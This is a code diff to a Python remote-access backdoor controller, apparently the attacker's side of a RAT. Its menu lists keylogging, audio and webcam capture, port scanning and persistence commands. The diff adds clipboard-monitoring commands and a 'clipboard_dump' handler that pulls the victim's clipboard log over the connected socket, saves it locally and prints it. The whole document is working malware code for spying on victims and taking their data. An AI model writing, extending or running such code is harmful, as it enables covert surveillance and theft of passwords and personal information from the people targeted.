@@ -154,6 +154,7 @@ class BackdoorController:
         AUDIO:              audio_record 10, audio_list
         WEBCAM:             webcam_snap
         NETWORK:            net_info, net_scan, net_connections, net_portscan, net_public_ip, net_check_internet
+        CLIPBOARD:          clipboard_start, clipboard_stop, clipboard_get, clipboard_dump
         PERSISTENCE:        persist_install, persist_check, persist_remove
 
         Type 'help_advanced' for detailed descriptions.
@@ -236,6 +237,49 @@ class BackdoorController:
                                         print("=== End of Keylog ===\n")
                             except Exception as e:
                                 print(f"[!] Error downloading keylog file: {e}")
+                    continue
+                
+                elif command == 'clipboard_dump':
+                    # Special handling for clipboard_dump - sends file automatically
+                    self.reliable_send(command)
+                    # First receive the status message
+                    result = self.reliable_recv()
+                    print("\n" + str(result))
+                    
+                    # If file exists, receive it
+                    if result and "Clipboard log file ready" in result:
+                        # Extract filename from message or use default
+                        import re
+                        match = re.search(r'Clipboard log file ready: (.+)', result)
+                        if match:
+                            remote_file = match.group(1)
+                            # Create local filename with timestamp
+                            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                            local_file = f'clipboard_dump_{timestamp}.txt'
+                            
+                            print(f"[*] Downloading clipboard log file...")
+                            try:
+                                with open(local_file, 'wb') as f:
+                                    self.target_socket.settimeout(3)
+                                    chunk = self.target_socket.recv(1024)
+                                    while chunk:
+                                        f.write(chunk)
+                                        try:
+                                            chunk = self.target_socket.recv(1024)
+                                        except socket.timeout:
+                                            break
+                                    self.target_socket.settimeout(None)
+                                print(f"[+] Clipboard log file downloaded: {local_file}")
+                                
+                                # Also display the content
+                                with open(local_file, 'r', encoding='utf-8') as f:
+                                    content = f.read()
+                                    if content:
+                                        print("\n=== Clipboard Log Content ===")
+                                        print(content)
+                                        print("=== End of Clipboard Log ===\n")
+                            except Exception as e:
+                                print(f"[!] Error downloading clipboard log file: {e}")
                     continue
                 
                 elif command[:6] == 'upload':
